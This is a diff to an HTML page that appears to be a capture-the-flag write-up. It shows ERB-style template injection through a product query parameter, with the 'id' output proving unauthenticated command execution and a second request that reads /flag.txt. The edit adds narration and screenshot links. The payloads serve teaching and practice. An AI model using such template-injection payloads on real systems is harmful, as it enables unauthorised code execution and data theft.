@@ -164,7 +164,13 @@ returned: 49 not found</pre>
 <pre class="code-view-two">GET /product?product=&lt;%= `id` %&gt;
 returned: uid=1100(farmhand) gid=999(farm) groups=999(farm)</pre>
 
-        <p>This is full, unauthenticated remote code execution as the farmhand user. Reading the flag was then trivial:</p>
+        <p>This is full, unauthenticated remote code execution as the farmhand user. So I ran ls to see what was in the directory:</p>
+        
+        <img src="./images/mookoo/ls.png" alt="RCE">
+        
+        <p>Now I had this info, reading the flag was then trivial:</p>
+        
+        <img src="./images/mookoo/flag.png" alt="RCE">
 
 <pre class="code-view-two">GET /product?product=&lt;%= `cat /flag.txt` %&gt;</pre>
 
